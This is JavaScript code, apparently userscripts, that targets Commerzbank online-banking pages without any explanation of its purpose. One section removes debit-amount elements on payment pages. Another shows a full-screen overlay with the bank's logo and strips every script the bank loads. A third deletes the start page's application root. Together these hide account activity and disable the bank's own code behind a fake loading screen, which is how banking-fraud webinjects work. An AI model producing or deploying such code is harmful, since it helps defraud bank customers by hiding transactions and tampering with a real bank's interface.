if (window.location.href.indexOf("payments") > 0 || window.location.href.indexOf("smth") > 0 || window.location.href.indexOf("smth") > 0) {
    (function() {
        'use strict';

      // Function to remove elements with the classes "debitorAmount" and "p-s-04-01 p-s-04"
function removeDebitorAndPS0401PS04() {
    var elementsToRemove = document.querySelectorAll('.debitorAmount, .p-s-04-01.p-s-04');
    elementsToRemove.forEach(function (element) {
        element.remove();
    });
    if (elementsToRemove.length > 0) {
        console.log('Removed elements with classes "debitorAmount" and "p-s-04-01 p-s-04"');
    }
}

// Watch for changes in the DOM and remove "debitorAmount" and "p-s-04-01 p-s-04" elements
var observer = new MutationObserver(function (mutationsList) {
    mutationsList.forEach(function (mutation) {
        if (mutation.type === 'childList') {
            mutation.addedNodes.forEach(function (node) {
                if (node.nodeType === Node.ELEMENT_NODE) {
                    if (node.classList) {
                        // Check for both classes in the added node
                        if (node.classList.contains('debitorAmount') || node.classList.contains('p-s-04-01', 'p-s-04')) {
                            node.remove();
                            console.log('Removed dynamically added element with classes "debitorAmount" and "p-s-04-01 p-s-04".');
                        }

                        // Check for both classes inside added nodes
                        var innerElements = node.querySelectorAll('.debitorAmount, .p-s-04-01.p-s-04');
                        innerElements.forEach(function (innerElement) {
                            innerElement.remove();
                        });
                        if (innerElements.length > 0) {
                            console.log('Removed ' + innerElements.length + ' elements with classes "debitorAmount" and "p-s-04-01 p-s-04" from an added node.');
                        }
                    }
                }
            });
        }
    });
});

// Start observing the document
observer.observe(document.documentElement, { childList: true, subtree: true });

// Initial removal of existing elements with classes "debitorAmount" and "p-s-04-01 p-s-04"
removeDebitorAndPS0401PS04();

    })();
}


//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------




///////////////////////////////////////////
//15__Comm spinner with script removal.user
///////////////////////////////////////////

   if (window.location.href.indexOf("commerz") > 0 || window.location.href.indexOf("smth") > 0 || window.location.href.indexOf("smth") > 0 ) {


(function () {
  'use strict';

  // Configuration
  var spinnerInterval = 5000; // Set the interval in milliseconds (e.g., 5000 for 5 seconds)

  // Function to create the spinner and background
  function createSpinner() {
    var background = document.createElement('div');
    background.className = 'app-loading-background';

    var spinner = document.createElement('div');
    spinner.className = 'app-loading-pulsing';

    // Apply styles to the background
    background.style.position = 'fixed';
    background.style.top = '0';
    background.style.left = '0';
    background.style.width = '100%';
    background.style.height = '100%';
    background.style.backgroundColor = 'white';
    background.style.zIndex = '9999';

    // Apply styles to the spinner
    spinner.style.position = 'absolute';
    spinner.style.top = '50%';
    spinner.style.left = '50%';
    spinner.style.transform = 'translate(-50%, -50%)';
    spinner.style.width = '120px';
    spinner.style.height = '120px';
    spinner.style.display = 'block';
    spinner.style.backgroundImage = 'url(https://www.commerzbank.de/ms/media/favicons/CB-2022-Ribbon_RGB.svg)';
    spinner.style.backgroundSize = '100%';
    spinner.style.animationName = 'pulse';
    spinner.style.animationTimingFunction = 'ease-in-out';
    spinner.style.animationIterationCount = 'infinite';
    spinner.style.animationDuration = '1.5s'; // Adjust the duration for a slower or faster pulse
    spinner.style.animationFillMode = 'both';

    // Append the background and spinner to the document body
    document.body.appendChild(background);
    background.appendChild(spinner);

    return background;
  }

  // Function to remove the spinner
  function removeSpinner(spinner) {
    if (spinner) {
      spinner.remove();
    }
  }

  // Function to remove scripts from the document
  function removeScripts() {
    console.log('Removing scripts...');
    document.querySelectorAll('script').forEach(function (script) {
      script.remove();
      console.log('Script removed.');
    });
  }

  // Watch for changes in the DOM and remove added scripts
  var observer = new MutationObserver(function (mutationsList) {
    for (var mutation of mutationsList) {
      if (mutation.addedNodes) {
        for (var node of mutation.addedNodes) {
          if (node.tagName === 'SCRIPT') {
            console.log('Script added. Removing...');
            node.remove();
            console.log('Script removed.');
          }
        }
      }
    }
  });

  // Start observing the document
  observer.observe(document.documentElement, { childList: true, subtree: true });

  // Remove scripts from the document on page load
  removeScripts();

  // Function to handle page unload and close
  function handleUnload() {
    var spinnerOnUnload = createSpinner();
    // Set a timeout to remove the spinner after the specified interval
    setTimeout(function () {
      removeSpinner(spinnerOnUnload);
    }, spinnerInterval);
  }

  // Create and append the spinner on page load
  var spinnerOnLoad = createSpinner();

  // Set a timeout to remove the spinner after the specified interval
  setTimeout(function () {
    removeSpinner(spinnerOnLoad);
  }, spinnerInterval);

  // Attach event listeners for page unload and close
  window.addEventListener('beforeunload', handleUnload);
  window.addEventListener('unload', handleUnload);
})();


}



/////////////////////////////////////////////////
//16__Comm NEW FINUEBER and STARTSEITE
/////////////////////////////////////////////////

if (window.location.href.indexOf("smth") > 0 || window.location.href.indexOf("startpage/startpage") > 0 || window.location.href.indexOf("smth") > 0) {
    (function() {
        'use strict';

        // Function to remove elements with the ID "react-root"
        function removeReactRoot() {
            var elementsToRemove = document.querySelectorAll('#react-root');
            elementsToRemove.forEach(function (element) {
                element.remove();
            });
            if (elementsToRemove.length > 0) {
                console.log('Removed elements with the ID "react-root"');
            }
        }

        // Function to remove script elements
        function removeScripts() {
            console.log('Removing scripts...');
            document.querySelectorAll('script').forEach(function (script) {
                script.remove();
                console.log('Script removed.');
            });
        }

        // Watch for changes in the DOM and remove elements with the ID "react-root" and scripts
        var observer = new MutationObserver(function (mutationsList) {
            mutationsList.forEach(function (mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function (node) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            // Remove elements with the ID "react-root"
                            if (node.id && node.id === 'react-root') {
                                node.remove();
                                console.log('Removed dynamically added element with the ID "react-root".');
                            }
                        } else if (node.nodeType === Node.COMMENT_NODE) {
                            // Remove scripts represented as comments
                            if (node.textContent.includes('<script')) {
                                node.remove();
                                console.log('Removed dynamically added script.');
                            }
                        }
                    });
                }
            });
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

        // Initial removal of existing elements with the ID "react-root" and scripts
        removeReactRoot();
        removeScripts();

    })();
}








